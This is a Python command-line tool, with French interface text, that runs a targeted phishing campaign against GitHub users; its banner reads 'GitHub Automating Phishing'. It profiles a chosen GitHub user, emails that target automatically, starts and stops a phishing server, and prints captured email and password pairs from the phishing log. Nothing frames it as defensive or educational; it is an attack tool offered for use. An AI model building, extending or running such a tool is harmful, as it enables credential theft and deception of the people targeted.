#!/usr/bin/env python3
"""
GitHub Manager CLI - Style SET
Un outil en ligne de commande interactif pour gérer les analyses GitHub et le serveur
"""

import subprocess
import os
import sys
import json
from pathlib import Path
import time

# Configuration des chemins
SCRIPT_DIR = Path("src/script")
MAIL_SERVICE = Path("src/service/mail_service/mail_sender.py")
SCRIPT_SH = SCRIPT_DIR / "script.sh"
SERVER_SH = SCRIPT_DIR / "server.sh"
KILL_SERVER_SH = SCRIPT_DIR / "kill_server.sh"
OUTPUT_JSON = Path("src/script/output.json")

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def clear_screen():
    """Efface l'écran"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """Affiche la bannière principale"""
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
░█████████  ░██        ░██           ░██        ░██     ░██            ░██        
░██     ░██ ░██                      ░██        ░██     ░██            ░██        
░██     ░██ ░████████  ░██ ░███████  ░████████  ░██     ░██ ░██    ░██ ░████████  
░█████████  ░██    ░██ ░██░██        ░██    ░██ ░██████████ ░██    ░██ ░██    ░██ 
░██         ░██    ░██ ░██ ░███████  ░██    ░██ ░██     ░██ ░██    ░██ ░██    ░██ 
░██         ░██    ░██ ░██       ░██ ░██    ░██ ░██     ░██ ░██   ░███ ░███   ░██ 
░██         ░██    ░██ ░██ ░███████  ░██    ░██ ░██     ░██  ░█████░██ ░██░█████  
                                                                                  
{Colors.END}
{Colors.YELLOW}                     GitHub Automating Phishing{Colors.END}
{Colors.MAGENTA}                              Version 1.0.0 - By MIHA Marino{Colors.END}
"""
    print(banner)

def print_separator():
    """Affiche un séparateur"""
    print(f"{Colors.BLUE}{'='*80}{Colors.END}")

def get_status_info():
    """Récupère les informations de statut"""
    status = {
        'email': False,
        'user': False,
        'user_data': {},
        'scripts_ok': True
    }
    
    # Vérifier les scripts
    for script in [SCRIPT_SH, SERVER_SH, KILL_SERVER_SH]:
        if not script.exists():
            status['scripts_ok'] = False
            break
    
    # Vérifier les données
    if OUTPUT_JSON.exists():
        try:
            with open(OUTPUT_JSON, 'r') as f:
                data = json.load(f)
            status['user_data'] = data
            status['email'] = bool(data.get('email'))
            status['user'] = bool(data.get('user'))
        except:
            pass
    
    return status

def print_menu():
    """Affiche le menu principal"""
    status = get_status_info()
    
    print_separator()
    print(f"{Colors.BOLD}{Colors.GREEN}   MENU PRINCIPAL{Colors.END}")
    print_separator()
    
    # Status indicators
    email_status = f"{Colors.GREEN}✅{Colors.END}" if status['email'] else f"{Colors.RED}❌{Colors.END}"
    user_status = f"{Colors.GREEN}✅{Colors.END}" if status['user'] else f"{Colors.RED}❌{Colors.END}"
    scripts_status = f"{Colors.GREEN}✅{Colors.END}" if status['scripts_ok'] else f"{Colors.RED}❌{Colors.END}"
    
    print(f"\n{Colors.BOLD}📊 STATUT ACTUEL :{Colors.END}")
    print(f"   Email configuré     : {email_status}")
    print(f"   Utilisateur analysé : {user_status}")
    print(f"   Scripts disponibles : {scripts_status}")
    
    if status['user_data']:
        print(f"\n{Colors.BOLD}📋 DONNÉES ACTUELLES :{Colors.END}")
        print(f"   📧 Email: {Colors.CYAN}{status['user_data'].get('email', 'N/A')}{Colors.END}")
        if status['user_data'].get('user'):
            print(f"   👤 User: {Colors.CYAN}{status['user_data'].get('user', 'N/A')}{Colors.END}")
            print(f"   📛 Nom: {Colors.CYAN}{status['user_data'].get('name', 'Non défini')}{Colors.END}")
            print(f"   📍 Localisation: {Colors.CYAN}{status['user_data'].get('location', 'Non défini')}{Colors.END}")
            print(f"   🏆 Top Lang: {Colors.CYAN}{status['user_data'].get('top', 'N/A')}{Colors.END}")
    
    print(f"\n{Colors.BOLD}🎯 OPTIONS DISPONIBLES :{Colors.END}")
    print(f"   {Colors.YELLOW}1{Colors.END}) 📧 Ajouter/Modifier l'email")
    print(f"   {Colors.YELLOW}2{Colors.END}) 👤 Analyser un utilisateur GitHub")
    print(f"   {Colors.YELLOW}3{Colors.END}) 📨 Envoyer un email à la cible")
    print(f"   {Colors.YELLOW}4{Colors.END}) 🚀 Démarrer le serveur")
    print(f"   {Colors.YELLOW}5{Colors.END}) 🛑 Arrêter le serveur")
    print(f"   {Colors.YELLOW}6{Colors.END}) 📋 Afficher le statut détaillé")
    print(f"   {Colors.YELLOW}7{Colors.END}) 🗑️  Réinitialiser les données")
    print(f"   {Colors.YELLOW}8{Colors.END}) 📄 Afficher le log du serveur phishing")
    print(f"   {Colors.YELLOW}99{Colors.END}) 🚪 Quitter")
    
    print_separator()

def run_command(command, cwd=None):
    """Exécute une commande et retourne le résultat"""
    try:
        result = subprocess.run(
            command, 
            shell=True, 
            capture_output=True, 
            text=True,
            cwd=cwd
        )
        return result
    except Exception as e:
        print(f"{Colors.RED}❌ Erreur lors de l'exécution : {e}{Colors.END}")
        return None

def add_email():
    """Ajouter un email"""
    print(f"\n{Colors.CYAN}📧 AJOUT D'EMAIL{Colors.END}")
    print_separator()
    
    email = input(f"{Colors.YELLOW}Entrez votre adresse email : {Colors.END}")
    
    if not email.strip():
        print(f"{Colors.RED}❌ Email vide. Opération annulée.{Colors.END}")
        return
    
    print(f"\n{Colors.CYAN}🔄 Enregistrement de l'email...{Colors.END}")
    
    result = run_command(f"bash {SCRIPT_SH} -e {email}")
    
    if result and result.returncode == 0:
        print(f"{Colors.GREEN}✅ Email enregistré avec succès !{Colors.END}")
        if result.stdout.strip():
            print(result.stdout.strip())
    else:
        print(f"{Colors.RED}❌ Échec de l'enregistrement{Colors.END}")
        if result and result.stderr.strip():
            print(result.stderr.strip())

def add_user():
    """Analyser un utilisateur GitHub"""
    print(f"\n{Colors.CYAN}👤 ANALYSE UTILISATEUR GITHUB{Colors.END}")
    print_separator()
    
    # Vérifier que l'email existe
    if not OUTPUT_JSON.exists():
        print(f"{Colors.RED}❌ Aucun email configuré. Utilisez d'abord l'option 1{Colors.END}")
        return
    
    username = input(f"{Colors.YELLOW}Nom d'utilisateur GitHub : {Colors.END}")
    token = input(f"{Colors.YELLOW}Token GitHub (optionnel, ENTER pour ignorer) : {Colors.END}")
    
    if not username.strip():
        print(f"{Colors.RED}❌ Nom d'utilisateur vide. Opération annulée.{Colors.END}")
        return
    
    # Construire la commande
    cmd = f"bash {SCRIPT_SH} -u {username.strip()}"
    if token.strip():
        cmd += f" -t {token.strip()}"
    
    print(f"\n{Colors.CYAN}🔄 Analyse de {username} en cours...{Colors.END}")
    
    result = run_command(cmd)
    
    if result and result.returncode == 0:
        print(f"{Colors.GREEN}✅ Analyse terminée avec succès !{Colors.END}")
        if result.stdout.strip():
            print(result.stdout.strip())
    else:
        print(f"{Colors.RED}❌ Échec de l'analyse{Colors.END}")
        if result and result.stderr.strip():
            print(result.stderr.strip())

def start_server():
    """Démarrer le serveur"""
    print(f"\n{Colors.CYAN}🚀 DÉMARRAGE DU SERVEUR{Colors.END}")
    print_separator()
    
    if not OUTPUT_JSON.exists():
        print(f"{Colors.RED}❌ Aucune donnée trouvée. Configurez d'abord email et utilisateur{Colors.END}")
        return
    
    print(f"{Colors.CYAN}🔄 Lancement du serveur...{Colors.END}")
    
    result = run_command(f"bash {SERVER_SH}")
    
    if result and result.returncode == 0:
        print(f"{Colors.GREEN}✅ Serveur démarré !{Colors.END}")
        if result.stdout.strip():
            print(result.stdout.strip())
    else:
        print(f"{Colors.RED}❌ Échec du démarrage{Colors.END}")
        if result and result.stderr.strip():
            print(result.stderr.strip())

def stop_server():
    """Arrêter le serveur"""
    print(f"\n{Colors.CYAN}🛑 ARRÊT DU SERVEUR{Colors.END}")
    print_separator()
    
    print(f"{Colors.CYAN}🔄 Arrêt du serveur...{Colors.END}")
    
    result = run_command(f"bash {KILL_SERVER_SH}")
    
    if result and result.returncode == 0:
        print(f"{Colors.GREEN}✅ Serveur arrêté !{Colors.END}")
        if result.stdout.strip():
            print(result.stdout.strip())
    else:
        print(f"{Colors.RED}❌ Échec de l'arrêt{Colors.END}")
        if result and result.stderr.strip():
            print(result.stderr.strip())

def show_detailed_status():
    """Affiche le statut détaillé"""
    print(f"\n{Colors.CYAN}📋 STATUT DÉTAILLÉ{Colors.END}")
    print_separator()
    
    # Vérifier les scripts
    print(f"\n{Colors.BOLD}📁 SCRIPTS :{Colors.END}")
    for script_name, script_path in [
        ("script.sh", SCRIPT_SH),
        ("server.sh", SERVER_SH), 
        ("kill_server.sh", KILL_SERVER_SH)
    ]:
        status = f"{Colors.GREEN}✅ Présent{Colors.END}" if script_path.exists() else f"{Colors.RED}❌ Manquant{Colors.END}"
        print(f"   {script_name:<15}: {status}")
    
    # Vérifier les données
    print(f"\n{Colors.BOLD}📊 DONNÉES :{Colors.END}")
    if OUTPUT_JSON.exists():
        try:
            with open(OUTPUT_JSON, 'r') as f:
                data = json.load(f)
            
            print(f"   output.json         : {Colors.GREEN}✅ Présent{Colors.END}")
            print(f"   📧 Email           : {Colors.CYAN}{data.get('email', 'Non défini')}{Colors.END}")
            print(f"   👤 Utilisateur     : {Colors.CYAN}{data.get('user', 'Non défini')}{Colors.END}")
            print(f"   📛 Nom             : {Colors.CYAN}{data.get('name', 'Non défini')}{Colors.END}")
            print(f"   📍 Localisation    : {Colors.CYAN}{data.get('location', 'Non défini')}{Colors.END}")
            print(f"   🏆 Langage principal: {Colors.CYAN}{data.get('top', 'Non défini')}{Colors.END}")
            print(f"   🔤 Tous langages   : {Colors.CYAN}{data.get('langages', 'Non défini')}{Colors.END}")
            
        except Exception as e:
            print(f"   output.json         : {Colors.RED}❌ Erreur de lecture : {e}{Colors.END}")
    else:
        print(f"   output.json         : {Colors.RED}❌ Non trouvé{Colors.END}")

def send_email():
    """Envoyer un email à la cible automatiquement"""
    print(f"\n{Colors.CYAN}📨 ENVOI D'EMAIL AUTOMATIQUE{Colors.END}")
    print_separator()
    
    if not OUTPUT_JSON.exists():
        print(f"{Colors.RED}❌ Aucune donnée trouvée. Configurez d'abord email et utilisateur{Colors.END}")
        return

    try:
        with open(OUTPUT_JSON, 'r') as f:
            data = json.load(f)
    except Exception as e:
        print(f"{Colors.RED}❌ Erreur de lecture des données : {e}{Colors.END}")
        return
    
    if not data.get('email') or not data.get('user'):
        print(f"{Colors.RED}❌ Données incomplètes. Configurez email et utilisateur d'abord{Colors.END}")
        return

    # Construire la commande pour exécuter mail_sender.py directement
    cmd = f"python3 {MAIL_SERVICE}"
    
    print(f"\n{Colors.CYAN}🔄 Envoi automatique de l'email...{Colors.END}")
    
    result = run_command(cmd)
    
    if result and result.returncode == 0:
        print(f"{Colors.GREEN}✅ Email envoyé avec succès !{Colors.END}")
        if result.stdout.strip():
            print(result.stdout.strip())
    else:
        print(f"{Colors.RED}❌ Échec de l'envoi{Colors.END}")
        if result and result.stderr.strip():
            print(result.stderr.strip())

def show_phishing_log():
    """Afficher le log du serveur phishing"""
    print(f"\n{Colors.CYAN}📄 LOG DU SERVEUR PHISHING{Colors.END}")
    print_separator()
    
    PHISHING_LOG = SCRIPT_DIR / "phishing.log"
    
    if not PHISHING_LOG.exists():
        print(f"{Colors.RED}❌ Aucun log trouvé ({PHISHING_LOG}){Colors.END}")
        return
    
    try:
        with open(PHISHING_LOG, 'r') as f:
            lines = f.readlines()
        
        if not lines:
            print(f"{Colors.YELLOW}ℹ️  Le log est vide pour le moment.{Colors.END}")
            return
        
        # Affichage des lignes contenant email et password
        for line in lines:
            if "email =" in line and "password =" in line:
                print(line.strip())
    except Exception as e:
        print(f"{Colors.RED}❌ Erreur lors de la lecture du log : {e}{Colors.END}")

def pause():
    """Pause avec message"""
    input(f"\n{Colors.MAGENTA}Appuyez sur ENTRÉE pour continuer...{Colors.END}")

def check_scripts():
    """Vérifie que tous les scripts existent"""
    missing = []
    for script in [SCRIPT_SH, SERVER_SH, KILL_SERVER_SH, MAIL_SERVICE]:
        if not script.exists():
            missing.append(str(script))
    
    if missing:
        print(f"{Colors.RED}❌ Scripts manquants :{Colors.END}")
        for script in missing:
            print(f"   - {script}")
        print(f"\n{Colors.YELLOW}⚠️  Placez les scripts dans leurs dossiers respectifs{Colors.END}")
        return False
    return True

def main_menu():
    """Menu principal interactif"""
    while True:
        clear_screen()
        print_banner()
        
        if not check_scripts():
            pause()
            continue
        
        print_menu()
        
        try:
            choice = input(f"\n{Colors.BOLD}{Colors.YELLOW}github_mgr > {Colors.END}")
            
            if choice == "1":
                add_email()
                pause()
                
            elif choice == "2":
                add_user()
                pause()
                
            elif choice == "3":
                send_email()
                pause()
                
            elif choice == "4":
                start_server()
                pause()
                
            elif choice == "5":
                stop_server()
                pause()
                
            elif choice == "6":
                show_detailed_status()
                pause()
                
            elif choice == "7":
                reset_data()
                pause()

            elif choice == "8":
                show_phishing_log()
                pause()
                
            elif choice == "99":
                print(f"\n{Colors.CYAN}👋 Au revoir !{Colors.END}")
                sys.exit(0)
                
            else:
                print(f"\n{Colors.RED}❌ Option invalide. Choisissez un numéro du menu.{Colors.END}")
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n\n{Colors.CYAN}👋 Au revoir !{Colors.END}")
            sys.exit(0)
        except Exception as e:
            print(f"\n{Colors.RED}❌ Erreur : {e}{Colors.END}")
            pause()

def reset_data():
    """Réinitialise les données utilisateur et le log"""
    confirm = input(f"{Colors.RED}⚠️  Cette action va supprimer toutes les données utilisateurs et le log. Continuer ? (y/N) : {Colors.END}")
    if confirm.lower() != 'y':
        print(f"{Colors.YELLOW}❌ Réinitialisation annulée.{Colors.END}")
        return

    # Supprimer output.json
    if OUTPUT_JSON.exists():
        try:
            OUTPUT_JSON.unlink()
            print(f"{Colors.GREEN}✅ Fichier '{OUTPUT_JSON}' supprimé.{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}❌ Impossible de supprimer '{OUTPUT_JSON}' : {e}{Colors.END}")
    else:
        print(f"{Colors.YELLOW}ℹ️  Fichier '{OUTPUT_JSON}' non trouvé.{Colors.END}")

    # Vider le log phishing si présent
    PHISHING_LOG = SCRIPT_DIR / "phishing.log"
    if PHISHING_LOG.exists():
        try:
            PHISHING_LOG.unlink()
            print(f"{Colors.GREEN}✅ Log '{PHISHING_LOG}' supprimé.{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}❌ Impossible de supprimer le log '{PHISHING_LOG}' : {e}{Colors.END}")
    else:
        print(f"{Colors.YELLOW}ℹ️  Log '{PHISHING_LOG}' non trouvé.{Colors.END}")

    print(f"{Colors.CYAN}🔄 Réinitialisation terminée.{Colors.END}")

if __name__ == '__main__':
    main_menu()